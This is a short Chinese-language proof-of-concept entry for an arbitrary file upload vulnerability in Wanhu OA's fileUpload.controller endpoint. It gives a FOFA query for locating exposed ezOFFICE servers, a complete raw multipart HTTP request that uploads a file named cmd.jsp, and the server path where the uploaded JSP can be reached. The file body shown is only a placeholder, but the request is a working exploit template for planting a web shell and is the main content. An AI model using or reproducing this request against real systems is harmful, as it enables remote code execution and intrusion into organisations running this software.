## 万户OA-fileUpload.controller任意文件上传漏洞

万户OA /defaultroot/upload/fileUpload.controller 任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa
```javascript
app="万户ezOFFICE协同管理平台"
```

## poc
```javascript
POST /defaultroot/upload/fileUpload.controller HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Length: 773

--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0
Content-Disposition: form-data; name="file"; filename="cmd.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

aaaaa
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--
```
![47f45d2a4762a6cf52707c1cddc901ef](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409261037078.png)

文件路径` /defaultroot/upload/html/xxxxxxxxxx.jsp`

